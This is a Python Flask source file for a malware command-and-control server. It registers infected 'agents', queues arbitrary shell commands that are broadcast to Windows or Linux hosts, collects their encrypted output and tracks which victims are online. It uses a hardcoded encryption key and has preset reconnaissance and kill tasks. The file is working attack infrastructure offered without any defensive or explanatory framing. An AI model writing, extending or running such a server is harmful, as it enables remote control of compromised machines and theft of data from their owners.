from flask import Flask, request, jsonify, send_from_directory
from cryptography.fernet import Fernet
from datetime import datetime
import sqlite3
import time
import json
import uuid
import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__, template_folder=BASE_DIR, static_folder=BASE_DIR)

SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
cipher = Fernet(SECRET_KEY)
DB_FILE = os.path.join(BASE_DIR, 'c2.db')
TARGET_BROADCASTS = {"ALL", "BROADCAST_WINDOWS", "BROADCAST_LINUX"}


def query_db(query, args=(), one=False):
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    try:
        cur.execute(query, args)
        rv = cur.fetchall()
        conn.commit()
        return (rv[0] if rv else None) if one else rv
    finally:
        conn.close()


def init_db():
    query_db('''CREATE TABLE IF NOT EXISTS agents
                (hostname TEXT PRIMARY KEY, ip TEXT, os TEXT, last_seen TEXT, relay TEXT)''')
    query_db('''CREATE TABLE IF NOT EXISTS results
                (id TEXT PRIMARY KEY, hostname TEXT, os TEXT, timestamp TEXT, output TEXT)''')
    query_db('''CREATE TABLE IF NOT EXISTS tasks
                (id INTEGER PRIMARY KEY AUTOINCREMENT, target_type TEXT, command TEXT, timestamp TEXT)''')
    query_db('''CREATE TABLE IF NOT EXISTS task_receipts
                (task_id INTEGER, hostname TEXT)''')


init_db()


def normalize_os_family(os_name):
    text = (os_name or "").lower()
    if "win" in text:
        return "WINDOWS"
    if any(x in text for x in ["linux", "ubuntu", "debian", "kali", "arch", "fedora", "centos"]):
        return "LINUX"
    if any(x in text for x in ["darwin", "mac", "os x"]):
        return "MAC"
    return "UNKNOWN"


def parse_status(last_seen, now):
    try:
        last_dt = datetime.combine(now.date(), datetime.strptime(last_seen, '%H:%M:%S').time())
        age = (now - last_dt).total_seconds()
        if age < 45:
            return "ONLINE"
        if age < 180:
            return "STALE"
        return "OFFLINE"
    except ValueError:
        return "UNKNOWN"


def status_weight(status):
    return {"ONLINE": 3, "STALE": 2, "OFFLINE": 1, "UNKNOWN": 0}.get(status, 0)


@app.route('/')
def dashboard():
    return send_from_directory(BASE_DIR, 'index.html')


@app.route('/checkin', methods=['POST'])
def checkin():
    try:
        decrypted_raw = cipher.decrypt(request.data).decode()
        data = json.loads(decrypted_raw)
        host = data.get('hostname', 'unknown')
        os_info = data.get('os', 'Unknown')
        os_family = normalize_os_family(os_info)

        query_db(
            "INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?, ?)",
            (host, request.remote_addr, os_info, time.strftime('%H:%M:%S'), request.headers.get('Host', 'Direct IP')),
        )

        cmd_row = query_db(
            '''SELECT * FROM tasks t
               WHERE (t.target_type = 'ALL' OR t.target_type = ? OR t.target_type = ?)
               AND NOT EXISTS (SELECT 1 FROM task_receipts r WHERE r.task_id = t.id AND r.hostname = ?)
               ORDER BY t.id ASC LIMIT 1''',
            (f"BROADCAST_{os_family}", host, host),
            one=True,
        )

        cmd = "none"
        if cmd_row:
            cmd = cmd_row['command']
            query_db("INSERT INTO task_receipts (task_id, hostname) VALUES (?, ?)", (cmd_row['id'], host))

        return cipher.encrypt(cmd.encode())
    except Exception:
        return "Error", 400


@app.route('/api/stats')
def api_stats():
    now = datetime.now()
    agents_raw = [dict(r) for r in query_db("SELECT * FROM agents")]
    tasks = [dict(r) for r in query_db("SELECT * FROM tasks ORDER BY id DESC")]

    agent_search = request.args.get('agent_search', '').strip().lower()
    agent_os = request.args.get('agent_os', 'ALL').upper()
    agent_status = request.args.get('agent_status', 'ALL').upper()

    results_search = request.args.get('results_search', '').strip().lower()
    results_os = request.args.get('results_os', 'ALL').upper()
    results_host = request.args.get('results_host', 'ALL')

    try:
        results_limit = min(max(int(request.args.get('results_limit', 150)), 25), 500)
    except ValueError:
        results_limit = 150

    enriched_agents = []
    os_counts = {"WINDOWS": 0, "LINUX": 0, "MAC": 0, "UNKNOWN": 0}
    status_counts = {"ONLINE": 0, "STALE": 0, "OFFLINE": 0, "UNKNOWN": 0}

    for a in agents_raw:
        os_family = normalize_os_family(a.get('os'))
        status = parse_status(a.get('last_seen', ''), now)
        os_counts[os_family] = os_counts.get(os_family, 0) + 1
        status_counts[status] = status_counts.get(status, 0) + 1
        a['os_family'] = os_family
        a['status'] = status
        enriched_agents.append(a)

    enriched_agents.sort(key=lambda x: (-status_weight(x['status']), x['hostname'].lower()))

    filtered_agents = []
    for a in enriched_agents:
        if agent_search and agent_search not in f"{a['hostname']} {a['os']} {a.get('ip', '')}".lower():
            continue
        if agent_os != 'ALL' and a['os_family'] != agent_os:
            continue
        if agent_status != 'ALL' and a['status'] != agent_status:
            continue
        filtered_agents.append(a)

    all_results = [dict(r) for r in query_db("SELECT * FROM results ORDER BY timestamp DESC, id DESC LIMIT 800")]
    filtered_results = []
    for r in all_results:
        r['os_family'] = normalize_os_family(r.get('os', ''))
        if results_os != 'ALL' and r['os_family'] != results_os:
            continue
        if results_host != 'ALL' and r['hostname'] != results_host:
            continue
        if results_search and results_search not in f"{r['hostname']} {r['output']} {r.get('os', '')}".lower():
            continue
        filtered_results.append(r)

    filtered_results = filtered_results[:results_limit]

    total_agents = len(enriched_agents)
    total_windows = os_counts.get('WINDOWS', 0)
    total_linux = os_counts.get('LINUX', 0)

    queue_data = []
    for t in tasks:
        receipts = [r['hostname'] for r in query_db("SELECT hostname FROM task_receipts WHERE task_id = ?", (t['id'],))]
        target = t['target_type']

        is_complete = False
        if target == "ALL" and total_agents > 0 and len(receipts) >= total_agents:
            is_complete = True
        elif target == "BROADCAST_WINDOWS" and total_windows > 0 and len(receipts) >= total_windows:
            is_complete = True
        elif target == "BROADCAST_LINUX" and total_linux > 0 and len(receipts) >= total_linux:
            is_complete = True
        elif target not in TARGET_BROADCASTS and len(receipts) > 0:
            is_complete = True

        if not is_complete:
            queue_data.append({
                "task_id": t['id'],
                "target": target,
                "command": t['command'],
                "timestamp": t.get('timestamp') or "--:--:--",
                "seen_count": len(receipts),
                "seen_list": receipts,
            })

    queue_data = queue_data[:300]

    cmd_volume = []
    for r in all_results[:200]:
        cmd_volume.append({"timestamp": r['timestamp'], "hostname": r['hostname']})

    return jsonify({
        "agents": filtered_agents,
        "results": filtered_results,
        "queue": queue_data,
        "total_count": status_counts.get('ONLINE', 0),
        "stats": {
            "total_agents": total_agents,
            "online_agents": status_counts.get('ONLINE', 0),
            "stale_agents": status_counts.get('STALE', 0),
            "offline_agents": status_counts.get('OFFLINE', 0),
            "unknown_agents": status_counts.get('UNKNOWN', 0),
            "windows_agents": os_counts.get('WINDOWS', 0),
            "linux_agents": os_counts.get('LINUX', 0),
            "mac_agents": os_counts.get('MAC', 0),
            "queue_size": len(queue_data),
            "results_count": len(filtered_results),
        },
        "filters": {
            "result_hosts": sorted({a['hostname'] for a in enriched_agents}, key=lambda x: x.lower()),
            "agent_hosts": sorted({a['hostname'] for a in enriched_agents}, key=lambda x: x.lower()),
        },
        "telemetry": {
            "recent_result_events": cmd_volume,
        }
    })


@app.route('/result', methods=['POST'])
def get_result():
    try:
        decrypted_output = cipher.decrypt(request.data).decode()
        if '|' not in decrypted_output:
            return "Format Error", 400

        host, output = decrypted_output.split('|', 1)
        agent = query_db("SELECT os FROM agents WHERE hostname = ?", (host,), one=True)
        os_type = agent['os'] if agent else "Unknown"

        query_db(
            "INSERT INTO results (id, hostname, os, timestamp, output) VALUES (?, ?, ?, ?, ?)",
            (str(uuid.uuid4())[:8], host, os_type, time.strftime('%H:%M:%S'), output),
        )
        return "OK", 200
    except Exception as e:
        print(f"Result Error: {e}")
        return "Error", 400


@app.route('/admin/send_cmd', methods=['POST'])
def send_command():
    target = request.form.get('target')
    command = request.form.get('command')

    if not target or not command or not command.strip():
        return "Missing fields", 400

    query_db(
        "INSERT INTO tasks (target_type, command, timestamp) VALUES (?, ?, ?)",
        (target, command.strip(), time.strftime('%H:%M:%S')),
    )
    return "OK", 200


@app.route('/admin/purge_tasks', methods=['POST'])
def purge_tasks():
    query_db("DELETE FROM tasks")
    query_db("DELETE FROM task_receipts")
    return "OK", 200


@app.route('/admin/action', methods=['POST'])
def agent_action():
    hostname = request.form.get('hostname')
    action = request.form.get('action')

    agent = query_db("SELECT os FROM agents WHERE hostname = ?", (hostname,), one=True)
    if not agent:
        return "Agent not found", 404

    is_windows = normalize_os_family(agent['os']) == "WINDOWS"

    commands = {
        "kill": "taskkill /F /IM python.exe" if is_windows else "pkill -f agent.py",
        "sysinfo": "Get-ComputerInfo | Select-Object OSName, OSVersion" if is_windows else "uname -a; cat /etc/os-release",
        "netstat": "Get-NetTCPConnection | Select-Object LocalAddress, RemoteAddress, State" if is_windows else "ss -tulpn",
        "whoami": "whoami",
    }

    cmd = commands.get(action)
    if not cmd:
        return "Invalid Action", 400

    query_db(
        "INSERT INTO tasks (target_type, command, timestamp) VALUES (?, ?, ?)",
        (hostname, cmd, time.strftime('%H:%M:%S')),
    )
    return jsonify({"status": "Tasked"}), 200


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
